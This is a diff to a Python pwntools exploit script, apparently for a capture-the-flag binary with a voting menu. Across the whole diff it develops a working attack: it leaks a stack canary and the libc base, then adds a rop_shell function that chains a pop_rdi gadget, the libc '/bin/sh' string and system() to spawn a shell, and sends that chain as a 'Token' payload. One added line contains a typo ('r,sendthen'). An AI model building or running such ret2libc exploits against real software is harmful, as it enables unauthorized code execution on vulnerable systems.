@@ -13,9 +13,9 @@ token = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
 offset_binsh = next(libc.search('/bin/sh'))
 offset_system = libc.symbols['system']
 offset_puts = elf.symbols['puts']
-# print('offset_binsh --> ', hex(offset_binsh))
-# print('offset_system --> ', hex(offset_system))
-# print('offset_puts --> ', hex(offset_puts))
+print('offset_binsh --> ', hex(offset_binsh))
+print('offset_system --> ', hex(offset_system))
+print('offset_puts --> ', hex(offset_puts))
 
 # accumulate vote for enough space to write buffer
 angel_vote = 0
@@ -49,9 +49,9 @@ def hack_vote_ret(canary, base):
     #                           |msg | cannary   |   rbp       |   ret            |)
     r.sendlineafter('Message: ', msg + canary    +  rbp        + p64(pop_r14r15_ret))
 
+    pause()
     r.recvuntil('>')
     r.sendline('3')
-    pause()
     r.recvuntil('>')
     r.sendline('3')
     recv_str = r.recvuntil('>').split('\n')
@@ -140,8 +140,25 @@ def rop_libc_base(canary, base):
     print('pop_rdi for libc_base --> ', hex(pop_rdi))
     print('libc_start_main for libc_base --> ', hex(libc_start_main))
     print('puts for libc_base --> ', hex(puts))
-    print('addr_main for ret main ', hex(addr_main))
+    print('addr_main for ret main --> ', hex(addr_main))
     print('ROP for libc_base --> ', p)
+    return p
+
+def rop_shell(canary, base, libc_base):
+    p = ''
+
+    pop_rdi = base + 0x11a3
+    p += p64(pop_rdi)
+
+    bin_sh = libc_base + offset_binsh
+    p += p64(bin_sh)
+
+    system = libc_base + offset_system
+    p += p64(system)
+
+    print('bin_sh for pwn --> ', hex(bin_sh))
+    print('system for pwn --> ', hex(system))
+
     return p
 
 def write_token(p):
@@ -176,6 +193,12 @@ def main():
     r.sendthen('Token: ', p1)
 
     print('base for hack_vote_ret --> ', hex(base))
+    libc_base = hack_vote_ret(canary, base)
+
+    p2 = rop_shell(canary, base, libc_base)
+    write_token(p2)
+    r.sendlineafter('>', '1')
+    r,sendthen('Token: ', p2)
     hack_vote_ret(canary, base)
 
 main()
